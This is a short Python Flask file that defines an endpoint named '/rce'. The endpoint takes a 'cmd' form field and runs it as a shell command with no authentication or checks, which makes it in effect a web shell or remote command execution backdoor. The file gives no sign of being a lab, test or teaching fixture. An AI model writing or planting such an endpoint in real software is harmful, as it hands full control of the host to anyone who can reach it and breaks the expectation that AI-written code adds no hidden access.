from flask import Flask, request
import subprocess
import os

app = Flask(__name__)

@app.route('/rce', methods=['POST'])
def rce():
    cmd = request.form.get('cmd', '')
    if not cmd:
        return 'Missing cmd', 400
    try:
        result = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return str(result.returncode), 200
    except Exception as e:
        return f'Error: {str(e)}', 500
